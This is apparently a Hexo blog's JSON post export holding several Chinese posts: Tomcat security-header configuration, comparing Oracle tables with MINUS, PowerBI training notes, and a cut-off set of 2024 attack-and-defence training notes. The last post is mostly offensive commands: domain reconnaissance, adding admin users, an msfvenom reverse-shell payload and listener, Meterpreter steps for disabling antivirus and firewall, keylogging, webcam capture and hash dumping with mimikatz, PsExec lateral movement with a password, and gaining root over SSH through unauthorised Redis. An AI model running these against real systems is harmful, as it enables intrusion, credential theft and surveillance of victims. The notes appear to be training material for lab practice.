start=\"2\">\n<li>验证</li>\n</ol>\n<p>重启 tomcat 后，在 http 请求中可以看到 返回的 Headers 中包含了</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">X-Content-Type-Options: nosniff</span><br><span class=\"line\">X-Frame-Options: SAMEORIGIN</span><br><span class=\"line\">X-XSS-Protection: 1; mode=block</span><br></pre></td></tr></table></figure>\n\n<p>这样就配置成功了。</p>\n<h1 id=\"来源\"><a href=\"#来源\" class=\"headerlink\" title=\"来源\"></a>来源</h1><ul>\n<li><a href=\"https://blog.csdn.net/qq_20324305/article/details/117414274\">关于网信办的扫描漏洞“X-Frame-Options”，“X-XSS-Protection“等三联漏洞</a></li>\n</ul>\n","site":{"data":{}},"excerpt":"<p>现在公司对需要投产的外联应用除了做代码扫描等工作，还需要进行渗透性测试，真的是改得欲仙欲死，最多的就是反射型 XSS 漏洞和存储型 XSS 漏洞了，这里先不表，还有就是需要对部署应用的 tomcat 进行配置，消掉扫出来的头缺失漏洞：X-Frame-Options、X-XSS-Protection、X-Content-Type-Options 头缺失漏洞。</p>","more":"<h1 id=\"步骤\"><a href=\"#步骤\" class=\"headerlink\" title=\"步骤\"></a>步骤</h1><ol>\n<li>在 web.xml（<code>$tomcat/conf/web.xml</code> or <code>$project/src/main/webapp/WEB-INF/web.xml</code>）中配置 filter</li>\n</ol>\n<figure class=\"highlight xml\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"tag\">&lt;<span class=\"name\">filter</span>&gt;</span></span><br><span class=\"line\">  <span class=\"tag\">&lt;<span class=\"name\">filter-name</span>&gt;</span>httpHeaderSecurity<span class=\"tag\">&lt;/<span class=\"name\">filter-name</span>&gt;</span></span><br><span class=\"line\">  <span class=\"tag\">&lt;<span class=\"name\">filter-class</span>&gt;</span>org.apache.catalina.filters.HttpHeaderSecurityFilter<span class=\"tag\">&lt;/<span class=\"name\">filter-class</span>&gt;</span></span><br><span class=\"line\">  <span class=\"comment\">&lt;!-- Frame-Options --&gt;</span></span><br><span class=\"line\">  <span class=\"tag\">&lt;<span class=\"name\">async-supported</span>&gt;</span>true<span class=\"tag\">&lt;/<span class=\"name\">async-supported</span>&gt;</span></span><br><span class=\"line\">  <span class=\"tag\">&lt;<span class=\"name\">init-param</span>&gt;</span></span><br><span class=\"line\">    <span class=\"tag\">&lt;<span class=\"name\">param-name</span>&gt;</span>antiClickJackingEnabled<span class=\"tag\">&lt;/<span class=\"name\">param-name</span>&gt;</span></span><br><span class=\"line\">    <span class=\"tag\">&lt;<span class=\"name\">param-value</span>&gt;</span>true<span class=\"tag\">&lt;/<span class=\"name\">param-value</span>&gt;</span></span><br><span class=\"line\">  <span class=\"tag\">&lt;/<span class=\"name\">init-param</span>&gt;</span></span><br><span class=\"line\">  <span class=\"tag\">&lt;<span class=\"name\">init-param</span>&gt;</span></span><br><span class=\"line\">    <span class=\"tag\">&lt;<span class=\"name\">param-name</span>&gt;</span>antiClickJackingOption<span class=\"tag\">&lt;/<span class=\"name\">param-name</span>&gt;</span></span><br><span class=\"line\">    <span class=\"tag\">&lt;<span class=\"name\">param-value</span>&gt;</span>SAMEORIGIN<span class=\"tag\">&lt;/<span class=\"name\">param-value</span>&gt;</span></span><br><span class=\"line\">  <span class=\"tag\">&lt;/<span class=\"name\">init-param</span>&gt;</span></span><br><span class=\"line\">  <span class=\"comment\">&lt;!-- XSS-Protection --&gt;</span></span><br><span class=\"line\">  <span class=\"tag\">&lt;<span class=\"name\">xssProtectionEnabled</span>&gt;</span>true<span class=\"tag\">&lt;/<span class=\"name\">xssProtectionEnabled</span>&gt;</span></span><br><span class=\"line\">  <span class=\"comment\">&lt;!-- Content-Type-Options --&gt;</span></span><br><span class=\"line\">  <span class=\"tag\">&lt;<span class=\"name\">BlockContentTypeSniffingEnabled</span>&gt;</span>true<span class=\"tag\">&lt;/<span class=\"name\">BlockContentTypeSniffingEnabled</span>&gt;</span></span><br><span class=\"line\"><span class=\"tag\">&lt;/<span class=\"name\">filter</span>&gt;</span></span><br><span class=\"line\"><span class=\"tag\">&lt;<span class=\"name\">filter-mapping</span>&gt;</span></span><br><span class=\"line\">  <span class=\"tag\">&lt;<span class=\"name\">filter-name</span>&gt;</span>httpHeaderSecurity<span class=\"tag\">&lt;/<span class=\"name\">filter-name</span>&gt;</span></span><br><span class=\"line\">  <span class=\"tag\">&lt;<span class=\"name\">url-pattern</span>&gt;</span>/*<span class=\"tag\">&lt;/<span class=\"name\">url-pattern</span>&gt;</span></span><br><span class=\"line\"><span class=\"tag\">&lt;/<span class=\"name\">filter-mapping</span>&gt;</span></span><br></pre></td></tr></table></figure>\n\n<ol start=\"2\">\n<li>验证</li>\n</ol>\n<p>重启 tomcat 后，在 http 请求中可以看到 返回的 Headers 中包含了</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">X-Content-Type-Options: nosniff</span><br><span class=\"line\">X-Frame-Options: SAMEORIGIN</span><br><span class=\"line\">X-XSS-Protection: 1; mode=block</span><br></pre></td></tr></table></figure>\n\n<p>这样就配置成功了。</p>\n<h1 id=\"来源\"><a href=\"#来源\" class=\"headerlink\" title=\"来源\"></a>来源</h1><ul>\n<li><a href=\"https://blog.csdn.net/qq_20324305/article/details/117414274\">关于网信办的扫描漏洞“X-Frame-Options”，“X-XSS-Protection“等三联漏洞</a></li>\n</ul>"},{"layout":"pages","title":"sql比较两张表数据是否相同","date":"2022-11-19T14:52:11.000Z","_content":"\n业务提出一个需求，提交某张表 A 的时候判断它与另一张表 B 的数据是否有改变，有的话提交表 A 前先提示更新数据，用程序判断简直是噩梦，只能搜索一下看能不能直接在数据库里面比较两批数据，幸好是有的。\n\n<!-- more -->\n\n先是找到说用 `inner join` 进行关联查询的，说是 `表 A 数据条数= 表 B 数据条数 = 表A inner join 表B 的条数` 即可认为一样，**但是要注意表 A 和表 B 里面要先分组去重**。\n\n不过后面又看到 `minus` 操作应该可以实现操作，感觉也比较简单一点，可以对查询结果集的进行减法操作。\n\nA minus B 就意味着将结果集 A 去除结果集 B 中所包含的所有记录后的结果，即在 A 中存在，而在 B 中不存在的记录。\n\n对 Oracle 来说，minus 操作有两点需要注意：\n\n- Oracle 的 minus 是按列进行比较的，所以 A 能够 minus B 的前提条件是结果集 A 和结果集 B 需要有相同的列数，且相同列索引的列具有相同的数据类型。\n- Oracle 会对 minus 后的结果集进行去重，即如果 A 中原本多条相同的记录数在进行 A minus B 后将会只剩一条对应的记录。\n\nsql 如下：\n\n```sql\nselect 字段名称 from 表1 minus select 字段名称 from 表2;\n```\n\n只要 A minus B 和 B minus A 都返回空集就可以了。\n\n# 参考文章\n\n- [如何用 sql 比较两张表数据是否一致？](https://zhuanlan.zhihu.com/p/113617244)\n- [Oracle 函数——MINUS](https://www.cnblogs.com/zuiyue_jing/p/12019766.html)\n","source":"_posts/2022/11/sql比较两张表数据是否相同.md","raw":"---\nlayout: pages\ntitle: sql比较两张表数据是否相同\ndate: 2022-11-19 22:52:11\ntags:\n  - SQL\ncategories:\n  - SQL\n---\n\n业务提出一个需求，提交某张表 A 的时候判断它与另一张表 B 的数据是否有改变，有的话提交表 A 前先提示更新数据，用程序判断简直是噩梦，只能搜索一下看能不能直接在数据库里面比较两批数据，幸好是有的。\n\n<!-- more -->\n\n先是找到说用 `inner join` 进行关联查询的，说是 `表 A 数据条数= 表 B 数据条数 = 表A inner join 表B 的条数` 即可认为一样，**但是要注意表 A 和表 B 里面要先分组去重**。\n\n不过后面又看到 `minus` 操作应该可以实现操作，感觉也比较简单一点，可以对查询结果集的进行减法操作。\n\nA minus B 就意味着将结果集 A 去除结果集 B 中所包含的所有记录后的结果，即在 A 中存在，而在 B 中不存在的记录。\n\n对 Oracle 来说，minus 操作有两点需要注意：\n\n- Oracle 的 minus 是按列进行比较的，所以 A 能够 minus B 的前提条件是结果集 A 和结果集 B 需要有相同的列数，且相同列索引的列具有相同的数据类型。\n- Oracle 会对 minus 后的结果集进行去重，即如果 A 中原本多条相同的记录数在进行 A minus B 后将会只剩一条对应的记录。\n\nsql 如下：\n\n```sql\nselect 字段名称 from 表1 minus select 字段名称 from 表2;\n```\n\n只要 A minus B 和 B minus A 都返回空集就可以了。\n\n# 参考文章\n\n- [如何用 sql 比较两张表数据是否一致？](https://zhuanlan.zhihu.com/p/113617244)\n- [Oracle 函数——MINUS](https://www.cnblogs.com/zuiyue_jing/p/12019766.html)\n","slug":"2022/11/sql比较两张表数据是否相同","published":1,"updated":"2022-11-19T15:13:58.926Z","comments":1,"photos":[],"link":"","_id":"clyh3xcj8003jzge38bxn2n9q","content":"<p>业务提出一个需求，提交某张表 A 的时候判断它与另一张表 B 的数据是否有改变，有的话提交表 A 前先提示更新数据，用程序判断简直是噩梦，只能搜索一下看能不能直接在数据库里面比较两批数据，幸好是有的。</p>\n<span id=\"more\"></span>\n\n<p>先是找到说用 <code>inner join</code> 进行关联查询的，说是 <code>表 A 数据条数= 表 B 数据条数 = 表A inner join 表B 的条数</code> 即可认为一样，<strong>但是要注意表 A 和表 B 里面要先分组去重</strong>。</p>\n<p>不过后面又看到 <code>minus</code> 操作应该可以实现操作，感觉也比较简单一点，可以对查询结果集的进行减法操作。</p>\n<p>A minus B 就意味着将结果集 A 去除结果集 B 中所包含的所有记录后的结果，即在 A 中存在，而在 B 中不存在的记录。</p>\n<p>对 Oracle 来说，minus 操作有两点需要注意：</p>\n<ul>\n<li>Oracle 的 minus 是按列进行比较的，所以 A 能够 minus B 的前提条件是结果集 A 和结果集 B 需要有相同的列数，且相同列索引的列具有相同的数据类型。</li>\n<li>Oracle 会对 minus 后的结果集进行去重，即如果 A 中原本多条相同的记录数在进行 A minus B 后将会只剩一条对应的记录。</li>\n</ul>\n<p>sql 如下：</p>\n<figure class=\"highlight sql\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">select</span> 字段名称 <span class=\"keyword\">from</span> 表<span class=\"number\">1</span> minus <span class=\"keyword\">select</span> 字段名称 <span class=\"keyword\">from</span> 表<span class=\"number\">2</span>;</span><br></pre></td></tr></table></figure>\n\n<p>只要 A minus B 和 B minus A 都返回空集就可以了。</p>\n<h1 id=\"参考文章\"><a href=\"#参考文章\" class=\"headerlink\" title=\"参考文章\"></a>参考文章</h1><ul>\n<li><a href=\"https://zhuanlan.zhihu.com/p/113617244\">如何用 sql 比较两张表数据是否一致？</a></li>\n<li><a href=\"https://www.cnblogs.com/zuiyue_jing/p/12019766.html\">Oracle 函数——MINUS</a></li>\n</ul>\n","site":{"data":{}},"excerpt":"<p>业务提出一个需求，提交某张表 A 的时候判断它与另一张表 B 的数据是否有改变，有的话提交表 A 前先提示更新数据，用程序判断简直是噩梦，只能搜索一下看能不能直接在数据库里面比较两批数据，幸好是有的。</p>","more":"<p>先是找到说用 <code>inner join</code> 进行关联查询的，说是 <code>表 A 数据条数= 表 B 数据条数 = 表A inner join 表B 的条数</code> 即可认为一样，<strong>但是要注意表 A 和表 B 里面要先分组去重</strong>。</p>\n<p>不过后面又看到 <code>minus</code> 操作应该可以实现操作，感觉也比较简单一点，可以对查询结果集的进行减法操作。</p>\n<p>A minus B 就意味着将结果集 A 去除结果集 B 中所包含的所有记录后的结果，即在 A 中存在，而在 B 中不存在的记录。</p>\n<p>对 Oracle 来说，minus 操作有两点需要注意：</p>\n<ul>\n<li>Oracle 的 minus 是按列进行比较的，所以 A 能够 minus B 的前提条件是结果集 A 和结果集 B 需要有相同的列数，且相同列索引的列具有相同的数据类型。</li>\n<li>Oracle 会对 minus 后的结果集进行去重，即如果 A 中原本多条相同的记录数在进行 A minus B 后将会只剩一条对应的记录。</li>\n</ul>\n<p>sql 如下：</p>\n<figure class=\"highlight sql\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">select</span> 字段名称 <span class=\"keyword\">from</span> 表<span class=\"number\">1</span> minus <span class=\"keyword\">select</span> 字段名称 <span class=\"keyword\">from</span> 表<span class=\"number\">2</span>;</span><br></pre></td></tr></table></figure>\n\n<p>只要 A minus B 和 B minus A 都返回空集就可以了。</p>\n<h1 id=\"参考文章\"><a href=\"#参考文章\" class=\"headerlink\" title=\"参考文章\"></a>参考文章</h1><ul>\n<li><a href=\"https://zhuanlan.zhihu.com/p/113617244\">如何用 sql 比较两张表数据是否一致？</a></li>\n<li><a href=\"https://www.cnblogs.com/zuiyue_jing/p/12019766.html\">Oracle 函数——MINUS</a></li>\n</ul>"},{"layout":"pages","title":"PowerBI数据分析最佳实践","date":"2022-12-08T00:53:25.000Z","_content":"\n2022 PowerBI 培训\n\n<!-- more -->\n\n# PowerBI 的组件与功能\n\nPowerBI 不适用场景：\n\n1. 数据存储和处理：Excel 可以保存相关数据，PowerBI 不直接保存数据\n2. 多数据提交查询：Excel 的多数据的动态刷新 PowerBI 很难实现\n3. 数据源动态刷新：Excel 支持多种数据源的动态刷新\n\nPowerBI 的组成组件\n\n- PowerQuery：在数据集成使用的是 PowerQuery 组件，数据建模通过此组件进行实现\n  > 数据获取、数据清洗、数据合并\n- PowerPivot：PowerPivot 组件提供了多表数据的整合能力，进行多表数据建模后可以进行多表相互透视\n- PowerBI：PowerBI 的 Chart 是经过数据清洗和 PowerPivot 建模之后进行数据呈现的最终目标，也是最重要的结果呈现\n\n数据制作者-PowerBI Desktop\n\n# 数据分析方法论\n\nExcel 实现数据分析采用的是大表模式，数据透视表只能将数据统一成一张大表进行数据透视。\n\n大表模式下存在的问题：\n\n1. 资源使用效率问题\n2. 数据上限问题\n3. 公式使用与效率问题\n4. 静态数据问题\n\n数据分析新模式-小表模式\n\n如何完成 PowerBI 报表的呈现过程\n\n1. 数据的集成与清洗（\n2. 数据质量的分析\n3. 数据的维度提取\n4. 日期表的构造\n5. 关系的删除与重构\n6. 度量值的构造\n7. 视觉对象的选择\n8. 视觉对象的设置\n\nPowerPivot 最重要的概念-关系\n\n- 一对多\n- 多对一\n- 一对一\n\n在 PowerBI 进行计算过程中，我们很多场景下必须保证维度表和事实表的独立，同时为了不影响计算性能，我们需要构建符合实际要求的度量值表，通常维度表和事实表之间都是一对多的关系。\n\n事实表：\n维度表：\n\n# 视觉对象组件\n\n构造印象深刻的报表\n\n1. 数据会说话\n\n- 言之有物：报表体现的内容必须呈现出相应的内容，空洞无物的报表没有任何意义\n- 言之有法：报表除了必须呈现需要的数据之外，还必须让数据体现出数据的情绪\n- 言之有颜：不好看的报表大家的关注会非常少\n- 言之有指：做报表必须找对报表所面对的对象，如果对象不对则报表根本无用\n\n2. 布局\n","source":"_posts/2022/12/PowerBI数据分析最佳实践.md","raw":"---\nlayout: pages\ntitle: PowerBI数据分析最佳实践\ndate: 2022-12-08 08:53:25\ntags:\n  - 培训\n  - PowerBI\ncategories:\n  - 培训\n  - PowerBI\n---\n\n2022 PowerBI 培训\n\n<!-- more -->\n\n# PowerBI 的组件与功能\n\nPowerBI 不适用场景：\n\n1. 数据存储和处理：Excel 可以保存相关数据，PowerBI 不直接保存数据\n2. 多数据提交查询：Excel 的多数据的动态刷新 PowerBI 很难实现\n3. 数据源动态刷新：Excel 支持多种数据源的动态刷新\n\nPowerBI 的组成组件\n\n- PowerQuery：在数据集成使用的是 PowerQuery 组件，数据建模通过此组件进行实现\n  > 数据获取、数据清洗、数据合并\n- PowerPivot：PowerPivot 组件提供了多表数据的整合能力，进行多表数据建模后可以进行多表相互透视\n- PowerBI：PowerBI 的 Chart 是经过数据清洗和 PowerPivot 建模之后进行数据呈现的最终目标，也是最重要的结果呈现\n\n数据制作者-PowerBI Desktop\n\n# 数据分析方法论\n\nExcel 实现数据分析采用的是大表模式，数据透视表只能将数据统一成一张大表进行数据透视。\n\n大表模式下存在的问题：\n\n1. 资源使用效率问题\n2. 数据上限问题\n3. 公式使用与效率问题\n4. 静态数据问题\n\n数据分析新模式-小表模式\n\n如何完成 PowerBI 报表的呈现过程\n\n1. 数据的集成与清洗（\n2. 数据质量的分析\n3. 数据的维度提取\n4. 日期表的构造\n5. 关系的删除与重构\n6. 度量值的构造\n7. 视觉对象的选择\n8. 视觉对象的设置\n\nPowerPivot 最重要的概念-关系\n\n- 一对多\n- 多对一\n- 一对一\n\n在 PowerBI 进行计算过程中，我们很多场景下必须保证维度表和事实表的独立，同时为了不影响计算性能，我们需要构建符合实际要求的度量值表，通常维度表和事实表之间都是一对多的关系。\n\n事实表：\n维度表：\n\n# 视觉对象组件\n\n构造印象深刻的报表\n\n1. 数据会说话\n\n- 言之有物：报表体现的内容必须呈现出相应的内容，空洞无物的报表没有任何意义\n- 言之有法：报表除了必须呈现需要的数据之外，还必须让数据体现出数据的情绪\n- 言之有颜：不好看的报表大家的关注会非常少\n- 言之有指：做报表必须找对报表所面对的对象，如果对象不对则报表根本无用\n\n2. 布局\n","slug":"2022/12/PowerBI数据分析最佳实践","published":1,"updated":"2023-06-18T13:53:13.696Z","comments":1,"photos":[],"link":"","_id":"clyh3xcj8003mzge39jykfr0x","content":"<p>2022 PowerBI 培训</p>\n<span id=\"more\"></span>\n\n<h1 id=\"PowerBI-的组件与功能\"><a href=\"#PowerBI-的组件与功能\" class=\"headerlink\" title=\"PowerBI 的组件与功能\"></a>PowerBI 的组件与功能</h1><p>PowerBI 不适用场景：</p>\n<ol>\n<li>数据存储和处理：Excel 可以保存相关数据，PowerBI 不直接保存数据</li>\n<li>多数据提交查询：Excel 的多数据的动态刷新 PowerBI 很难实现</li>\n<li>数据源动态刷新：Excel 支持多种数据源的动态刷新</li>\n</ol>\n<p>PowerBI 的组成组件</p>\n<ul>\n<li>PowerQuery：在数据集成使用的是 PowerQuery 组件，数据建模通过此组件进行实现<blockquote>\n<p>数据获取、数据清洗、数据合并</p>\n</blockquote>\n</li>\n<li>PowerPivot：PowerPivot 组件提供了多表数据的整合能力，进行多表数据建模后可以进行多表相互透视</li>\n<li>PowerBI：PowerBI 的 Chart 是经过数据清洗和 PowerPivot 建模之后进行数据呈现的最终目标，也是最重要的结果呈现</li>\n</ul>\n<p>数据制作者-PowerBI Desktop</p>\n<h1 id=\"数据分析方法论\"><a href=\"#数据分析方法论\" class=\"headerlink\" title=\"数据分析方法论\"></a>数据分析方法论</h1><p>Excel 实现数据分析采用的是大表模式，数据透视表只能将数据统一成一张大表进行数据透视。</p>\n<p>大表模式下存在的问题：</p>\n<ol>\n<li>资源使用效率问题</li>\n<li>数据上限问题</li>\n<li>公式使用与效率问题</li>\n<li>静态数据问题</li>\n</ol>\n<p>数据分析新模式-小表模式</p>\n<p>如何完成 PowerBI 报表的呈现过程</p>\n<ol>\n<li>数据的集成与清洗（</li>\n<li>数据质量的分析</li>\n<li>数据的维度提取</li>\n<li>日期表的构造</li>\n<li>关系的删除与重构</li>\n<li>度量值的构造</li>\n<li>视觉对象的选择</li>\n<li>视觉对象的设置</li>\n</ol>\n<p>PowerPivot 最重要的概念-关系</p>\n<ul>\n<li>一对多</li>\n<li>多对一</li>\n<li>一对一</li>\n</ul>\n<p>在 PowerBI 进行计算过程中，我们很多场景下必须保证维度表和事实表的独立，同时为了不影响计算性能，我们需要构建符合实际要求的度量值表，通常维度表和事实表之间都是一对多的关系。</p>\n<p>事实表：<br>维度表：</p>\n<h1 id=\"视觉对象组件\"><a href=\"#视觉对象组件\" class=\"headerlink\" title=\"视觉对象组件\"></a>视觉对象组件</h1><p>构造印象深刻的报表</p>\n<ol>\n<li>数据会说话</li>\n</ol>\n<ul>\n<li>言之有物：报表体现的内容必须呈现出相应的内容，空洞无物的报表没有任何意义</li>\n<li>言之有法：报表除了必须呈现需要的数据之外，还必须让数据体现出数据的情绪</li>\n<li>言之有颜：不好看的报表大家的关注会非常少</li>\n<li>言之有指：做报表必须找对报表所面对的对象，如果对象不对则报表根本无用</li>\n</ul>\n<ol start=\"2\">\n<li>布局</li>\n</ol>\n","site":{"data":{}},"excerpt":"<p>2022 PowerBI 培训</p>","more":"<h1 id=\"PowerBI-的组件与功能\"><a href=\"#PowerBI-的组件与功能\" class=\"headerlink\" title=\"PowerBI 的组件与功能\"></a>PowerBI 的组件与功能</h1><p>PowerBI 不适用场景：</p>\n<ol>\n<li>数据存储和处理：Excel 可以保存相关数据，PowerBI 不直接保存数据</li>\n<li>多数据提交查询：Excel 的多数据的动态刷新 PowerBI 很难实现</li>\n<li>数据源动态刷新：Excel 支持多种数据源的动态刷新</li>\n</ol>\n<p>PowerBI 的组成组件</p>\n<ul>\n<li>PowerQuery：在数据集成使用的是 PowerQuery 组件，数据建模通过此组件进行实现<blockquote>\n<p>数据获取、数据清洗、数据合并</p>\n</blockquote>\n</li>\n<li>PowerPivot：PowerPivot 组件提供了多表数据的整合能力，进行多表数据建模后可以进行多表相互透视</li>\n<li>PowerBI：PowerBI 的 Chart 是经过数据清洗和 PowerPivot 建模之后进行数据呈现的最终目标，也是最重要的结果呈现</li>\n</ul>\n<p>数据制作者-PowerBI Desktop</p>\n<h1 id=\"数据分析方法论\"><a href=\"#数据分析方法论\" class=\"headerlink\" title=\"数据分析方法论\"></a>数据分析方法论</h1><p>Excel 实现数据分析采用的是大表模式，数据透视表只能将数据统一成一张大表进行数据透视。</p>\n<p>大表模式下存在的问题：</p>\n<ol>\n<li>资源使用效率问题</li>\n<li>数据上限问题</li>\n<li>公式使用与效率问题</li>\n<li>静态数据问题</li>\n</ol>\n<p>数据分析新模式-小表模式</p>\n<p>如何完成 PowerBI 报表的呈现过程</p>\n<ol>\n<li>数据的集成与清洗（</li>\n<li>数据质量的分析</li>\n<li>数据的维度提取</li>\n<li>日期表的构造</li>\n<li>关系的删除与重构</li>\n<li>度量值的构造</li>\n<li>视觉对象的选择</li>\n<li>视觉对象的设置</li>\n</ol>\n<p>PowerPivot 最重要的概念-关系</p>\n<ul>\n<li>一对多</li>\n<li>多对一</li>\n<li>一对一</li>\n</ul>\n<p>在 PowerBI 进行计算过程中，我们很多场景下必须保证维度表和事实表的独立，同时为了不影响计算性能，我们需要构建符合实际要求的度量值表，通常维度表和事实表之间都是一对多的关系。</p>\n<p>事实表：<br>维度表：</p>\n<h1 id=\"视觉对象组件\"><a href=\"#视觉对象组件\" class=\"headerlink\" title=\"视觉对象组件\"></a>视觉对象组件</h1><p>构造印象深刻的报表</p>\n<ol>\n<li>数据会说话</li>\n</ol>\n<ul>\n<li>言之有物：报表体现的内容必须呈现出相应的内容，空洞无物的报表没有任何意义</li>\n<li>言之有法：报表除了必须呈现需要的数据之外，还必须让数据体现出数据的情绪</li>\n<li>言之有颜：不好看的报表大家的关注会非常少</li>\n<li>言之有指：做报表必须找对报表所面对的对象，如果对象不对则报表根本无用</li>\n</ul>\n<ol start=\"2\">\n<li>布局</li>\n</ol>"},{"title":"2024网络安全攻防技术培训","date":"2024-06-25T01:00:00.000Z","_content":"\n2024网络安全攻防技术培训部分笔记\n\n<!-- more -->\n\n# Windows信息收集\n\n```bash\n# windows信息收集\n ipconfig /all   # 查看本机ip，所在域\n route print     # 打印路由信息\n net view        # 查看局域网内其他主机名\n arp -a          # 查看arp缓存\n net start       # 查看开启了哪些服务\n net share       # 查看开启了哪些共享\n net share ipc$  # 开启ipc共享\n net share c$    # 开启c盘共享\n net use \\\\192.168.xx.xx\\ipc$ \"\" /user:\"\"    # 与192.168.xx.xx建立空连接\n net use \\\\192.168.xx.xx\\c$ \"密码\" /user:\"用户名\"    # 建立c盘共享\n dir \\\\192.168.xx.xx\\c$\\user    # 查看192.168.xx.xx c盘user目录下的文件\n\n# 域信息收集\n net config Workstation    # 查看计算机名、全名、用户名、系统版本、工作站、域、登录域\n net user                 # 查看本机用户列表\n net user /domain         # 查看域用户\n net localgroup administrators    # 查看本地管理员组（通常会有域用户）\n net view /domain         # 查看有几个域\n net user 用户名 /domain   # 获取指定域用户的信息\n net group /domain        # 查看域里面的工作组，查看把用户分了多少组（只能在域控上操作）\n net group 组名 /domain    # 查看域中某工作组\n net group \"domain admins\" /domain  # 查看域管理员的名字\n net group \"domain computers\" /domain  # 查看域中的其他主机名\n net group \"doamin controllers\" /domain  # 查看域控制器（可能有多台）\n\n# 添加用户\n net user xx xxxx /add      # 添加用户\n net localgroup administrators xx /add  # 添加用户到域\n```\n\n使用Metasploit生成反弹shell后门程序，上传靶机执行，上线后抓取口令。\n\n[Metasploit (MSF) 使用:包含基本使用、payload生成、后渗透模块使用](https://blog.csdn.net/x319427393/article/details/129366648)\n\n```bash\nmsfconsole\n\n# msf6 >\nmsfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=172.24.31.172 LPORT=5353 -f exe > shell.exe   # 生成反传程序\n\nuse exploit/multi/handler\n\n# msf6 exploit(multi/handler) >\nset payload windows/meterpreter/reverse_tcp   # 设置payload\n\nshow options # 查看配置\n\nset lhost 172.24.31.172     # 配置lhost，lport配置同理\n\nexploit # 监听反传，需要先将前面生成的反传程序在靶机运行\n```\n\n成功劫持后常用模块：\n\n```bash\n1、获取系统运行平台: sysinfo\n2、提取系统信息: run scraper\n3、查看进行: ps\n4、迁移进行: migrate 1774\n5、查看文件: cat 文件\n6、查看当前路径: pwd\n7、搜索文件: search -d c:\\\\ -f *.doc\n8、其他命令类似于Linux命令: cd, rm, mkdir, rmdir, dir, mv等等\n9、上传文件: upload 本机路径 上传目标路径\n10、下载文件: download 目标路径 本机路径\n11、进程迁移: run post/windows/manage/migrate\n12、关闭杀软: run post/windows/manage/killav\n13、通过shell来关闭防火墙: netsh advfirewall set allprofiles state off \n14、截屏: screenshot\n15、查看桌面: run vnc\n16、开启3389: run post/windows/manage/enable_rdp\n17、提权模块: mult/recon/local_exploit_suggester 设置过去的session ID\n\t\t\t\t 执行之后会返回可以提权的模块，然后进行调用，设置session提权，成功会返回新的会话\n18、运行程序: execute -f notepad.exe 加H可以进行隐藏运行\n19、摄像头命令:\n\t\t\t\t\t音频录制: record_mic\n\t\t\t\t\t查看摄像头接口: webcam_chat\n\t\t\t\t\t查看摄像头列表: webcam_list\n\t\t\t\t\t摄像头视频获取: webcam_stream\n20、端口转发: 作用如果目标机器在内网开放3389，外网无法连接，这个时候进行端口转发，利用会话将目标机器3389转发到本地，实现3389远程连接\n\t\t\t\t\t-L: 要监听的本地主机ip（可选）\n\t\t\t\t\t-h: 帮助\n\t\t\t\t\t-l: 要监听的本地端口\n\t\t\t\t\t-p: 要连接到的远程端口\n\t\t\t\t\t-r: 要连接的远程主机ip\n\t\t\t\t\tportfwd add -l 4444 -p 3389 -r 10.211.55.7 // 把目标机10.211.55.7的3389端口转发到本机127.0.0.1的4444端口，直接进行连接本机4444端口即可3389远程连接，同样如果本地两台电脑，另一台电脑直接远程访问开启4444主机的IP+4444可以直接进行连接，，，，注意端口转发并不需要高权限上线就可以直接转发。\n21、键盘记录:\n\t\t\t\tkeyscan_start: 开启键盘记录功能\n\t\t\t\tkeyscan_dump: 显示捕捉的键盘记录信息\n\t\t\t\tkeyscan_stop: 停止键盘记录\n21、获取hash值: load mimikatz（32位）load kivi（64位）此时调用完成就直接可以使用该模块的命令，但是使用该命令需要拥有系统system权限，同样也可以使用hashdump导出\n22、盗取身份令牌: use incognito\n\t\t\t\t\tlist_tokens -u: 列出目标主机用户组可用的令牌，有的话可以直接进行身份切换\n\t\t\t\t\tlist_tokens -g: 列出目标主机用户组可用的令牌，有的话可以直接进行身份切换\n\t\t\t\t\timpersonate_token LUCKYXBDC6\\luckyx: 切换令牌身份\n```\n\n使用微软PsExec工具连接服务器cmd，控制域控。\n\n[【渗透测试笔记】之【内网渗透——横向移动：PsExec的使用】](https://blog.csdn.net/qq_44874645/article/details/121394678)\n\n```bash\nPsExec64.exe /accepteula /s \\\\192.168.52.138 -u Administrator -p 12345@QwerT cmd\n```\n\n# 内网穿透\n\n工具：\n\n- ew\n- frp\n- nps\n- metasploit\n- CobalStrike\n\n# 尝试\n\nfscan 扫描端口与服务。\n\n比如扫出 cve 漏洞，搜索如何利用漏洞攻击；redis未授权漏洞中 `/root/.ssh/` 可写的话可直接上传公钥连接ssh。\n\n- 通过redis备份方式写入\n\n[Redis未授权访问写Webshell和公私钥认证获取root权限](https://www.cnblogs.com/-qing-/p/10978912.html)\n\n- 通过fscan写入redis文件\n\n```bash\nfscan -h 172.24.31.169 -rf /home/kali/.ssh/id_rsa.pub\n\nssh -i id_rsa root@172.24.31.169\n```\n\n注：使用python开启web下载服务器\n\n```bash\n# python2 开启web下载服务器（后台有日志）\nnohup python -u -m SimpleHTTPServer > download.log 2>&1 &\n\n# python3 开启web下载服务器\npython -m http.server 